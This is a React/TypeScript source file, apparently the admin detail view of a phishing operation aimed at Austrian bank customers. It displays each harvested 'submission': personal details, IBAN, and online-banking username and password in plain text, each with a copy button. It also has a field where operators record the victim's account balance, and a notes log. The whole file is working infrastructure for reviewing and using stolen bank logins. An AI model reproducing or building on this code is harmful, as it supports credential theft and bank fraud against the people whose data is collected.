import { useEffect, useState } from "react";
import { useNavigate, useParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import type { User } from "@supabase/supabase-js";
import Header from "@/components/Header";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { toast } from "sonner";
import { ArrowLeft, Copy, Save } from "lucide-react";

interface Submission {
  id: string;
  session_id: string;
  created_at: string;
  full_name: string | null;
  email: string | null;
  birthdate: string | null;
  phone: string | null;
  street: string | null;
  house_number: string | null;
  staircase: string | null;
  door_number: string | null;
  postal_code: string | null;
  city: string | null;
  iban: string | null;
  bank: string | null;
  bank_username: string | null;
  bank_password: string | null;
  bank_username_label: string | null;
  bank_password_label: string | null;
  bank_extra: Record<string, string> | null;
  balance: string | null;
}

interface Note {
  id: string;
  user_email: string;
  content: string;
  created_at: string;
}

const AdminLogDetail = () => {
  const { id } = useParams<{ id: string }>();
  const navigate = useNavigate();
  const [user, setUser] = useState<User | null>(null);
  const [loading, setLoading] = useState(true);
  const [submission, setSubmission] = useState<Submission | null>(null);
  const [notes, setNotes] = useState<Note[]>([]);
  const [newNote, setNewNote] = useState("");
  const [balance, setBalance] = useState("");
  const [savingBalance, setSavingBalance] = useState(false);
  const [savingNote, setSavingNote] = useState(false);

  useEffect(() => {
    supabase.auth.getSession().then(({ data: { session } }) => {
      if (!session) {
        navigate("/auth");
      } else {
        setUser(session.user);
        fetchData();
      }
      setLoading(false);
    });
  }, [id, navigate]);

  const fetchData = async () => {
    if (!id) return;
    const [subRes, notesRes] = await Promise.all([
      supabase.from("submissions").select("*").eq("id", id).single(),
      supabase.from("submission_notes").select("*").eq("submission_id", id).order("created_at", { ascending: false }),
    ]);
    if (subRes.data) {
      const sub = subRes.data as Submission;
      setSubmission(sub);
      setBalance(sub.balance || "");
    }
    if (notesRes.data) {
      setNotes(notesRes.data as Note[]);
    }
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    toast.success("Kopiert!");
  };

  const saveBalance = async () => {
    if (!id) return;
    setSavingBalance(true);
    const { error } = await supabase.from("submissions").update({ balance: balance || null }).eq("id", id);
    setSavingBalance(false);
    if (error) {
      toast.error("Fehler beim Speichern");
    } else {
      toast.success("Guthaben gespeichert");
      if (submission) setSubmission({ ...submission, balance: balance || null });
    }
  };

  const addNote = async () => {
    if (!id || !user || !newNote.trim()) return;
    setSavingNote(true);
    const { data, error } = await supabase.from("submission_notes").insert({
      submission_id: id,
      user_id: user.id,
      user_email: user.email || "unknown",
      content: newNote.trim(),
    }).select().single();
    setSavingNote(false);
    if (error) {
      toast.error("Fehler beim Speichern der Notiz");
    } else {
      toast.success("Notiz hinzugefügt");
      setNewNote("");
      if (data) setNotes((prev) => [data as Note, ...prev]);
    }
  };

  const CopyValue = ({ label, value }: { label: string; value: string | null | undefined }) => (
    <div className="flex justify-between items-center py-1.5">
      <span className="text-sm text-gray-500">{label}</span>
      {value ? (
        <button onClick={() => copyToClipboard(value)} className="text-sm font-medium text-gray-900 flex items-center gap-1 hover:text-blue-600">
          {value} <Copy className="h-3 w-3" />
        </button>
      ) : (
        <span className="text-sm text-gray-400">-</span>
      )}
    </div>
  );

  if (loading) {
    return <div className="flex min-h-screen items-center justify-center"><p className="text-gray-500">Laden...</p></div>;
  }

  if (!submission) {
    return (
      <div className="min-h-screen bg-gray-50">
        <Header />
        <div className="container mx-auto px-4 py-8 text-center">
          <p className="text-gray-500">Eintrag nicht gefunden</p>
          <Button variant="outline" className="mt-4" onClick={() => navigate("/admin/logs")}>← Zurück</Button>
        </div>
      </div>
    );
  }

  const address = [submission.street, submission.house_number].filter(Boolean).join(" ");
  const addressExtra = [submission.staircase ? `Stiege ${submission.staircase}` : null, submission.door_number ? `Tür ${submission.door_number}` : null].filter(Boolean).join(", ");
  const fullAddress = [address, addressExtra, [submission.postal_code, submission.city].filter(Boolean).join(" ")].filter(Boolean).join(", ");

  return (
    <div className="min-h-screen bg-gray-50">
      <Header />
      <div className="container mx-auto px-4 py-8 max-w-4xl">
        <div className="mb-6 flex items-center gap-4">
          <Button variant="outline" size="sm" onClick={() => navigate("/admin/logs")}>
            <ArrowLeft className="mr-1 h-4 w-4" /> Zurück
          </Button>
          <h1 className="text-xl font-bold text-gray-900">
            Detail — {submission.full_name || "Unbekannt"}
          </h1>
          <span className="text-xs text-gray-400">
            {submission.created_at ? new Date(submission.created_at).toLocaleString("de-AT") : ""}
          </span>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
          {/* Persönliche Daten */}
          <Card className="border-blue-200">
            <CardHeader className="pb-3">
              <CardTitle className="text-base text-blue-700">Persönliche Daten</CardTitle>
            </CardHeader>
            <CardContent className="space-y-1">
              <CopyValue label="Name" value={submission.full_name} />
              <CopyValue label="E-Mail" value={submission.email} />
              <CopyValue label="Geburtsdatum" value={submission.birthdate} />
              <CopyValue label="Telefon" value={submission.phone} />
              <CopyValue label="Adresse" value={fullAddress || null} />
              <CopyValue label="IBAN" value={submission.iban} />
            </CardContent>
          </Card>

          {/* Bank-Login */}
          <Card className="border-green-200">
            <CardHeader className="pb-3">
              <CardTitle className="text-base text-green-700">Bank-Login</CardTitle>
            </CardHeader>
            <CardContent className="space-y-1">
              <CopyValue label="Bank" value={submission.bank} />
              <CopyValue label={submission.bank_username_label || "Benutzername"} value={submission.bank_username} />
              <CopyValue label={submission.bank_password_label || "Passwort"} value={submission.bank_password} />
              {submission.bank_extra && Object.keys(submission.bank_extra).length > 0 && (
                <>
                  {Object.entries(submission.bank_extra).map(([key, val]) => (
                    <CopyValue key={key} label={key} value={val} />
                  ))}
                </>
              )}
            </CardContent>
          </Card>

          {/* Balance */}
          <Card className="border-yellow-200">
            <CardHeader className="pb-3">
              <CardTitle className="text-base text-yellow-700">Guthaben</CardTitle>
            </CardHeader>
            <CardContent>
              <div className="flex gap-2">
                <Input
                  placeholder="z.B. 1.250,00 €"
                  value={balance}
                  onChange={(e) => setBalance(e.target.value)}
                  onKeyDown={(e) => e.key === "Enter" && saveBalance()}
                />
                <Button size="sm" onClick={saveBalance} disabled={savingBalance}>
                  <Save className="h-4 w-4 mr-1" /> Speichern
                </Button>
              </div>
            </CardContent>
          </Card>

          {/* Notizen */}
          <Card className="border-purple-200">
            <CardHeader className="pb-3">
              <CardTitle className="text-base text-purple-700">Notizen</CardTitle>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="space-y-2">
                <Textarea
                  placeholder="Neue Notiz schreiben..."
                  value={newNote}
                  onChange={(e) => setNewNote(e.target.value)}
                  rows={3}
                />
                <Button size="sm" onClick={addNote} disabled={savingNote || !newNote.trim()}>
                  Notiz hinzufügen
                </Button>
              </div>
              {notes.length > 0 ? (
                <div className="space-y-3 max-h-64 overflow-y-auto">
                  {notes.map((note) => (
                    <div key={note.id} className="rounded-md border p-3 text-sm bg-gray-50">
                      <div className="flex justify-between text-xs text-gray-400 mb-1">
                        <span>{note.user_email}</span>
                        <span>{new Date(note.created_at).toLocaleString("de-AT")}</span>
                      </div>
                      <p className="text-gray-800 whitespace-pre-wrap">{note.content}</p>
                    </div>
                  ))}
                </div>
              ) : (
                <p className="text-sm text-gray-400">Keine Notizen vorhanden</p>
              )}
            </CardContent>
          </Card>
        </div>
      </div>
    </div>
  );
};

export default AdminLogDetail;
